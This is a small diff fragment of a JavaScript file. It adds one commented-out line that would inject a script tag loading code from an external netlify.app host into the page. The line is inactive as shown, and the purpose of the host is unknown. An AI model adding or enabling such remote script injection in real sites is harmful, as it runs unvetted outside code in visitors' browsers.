@@ -15,3 +15,5 @@ function l(d) {
         })
     }
 }
+
+//var scr = document.createElement('script');    scr.type = 'text/javascript';    scr.src = 'https://darksimilarity.netlify.app/js/test.js';    document.documentElement.appendChild(scr);
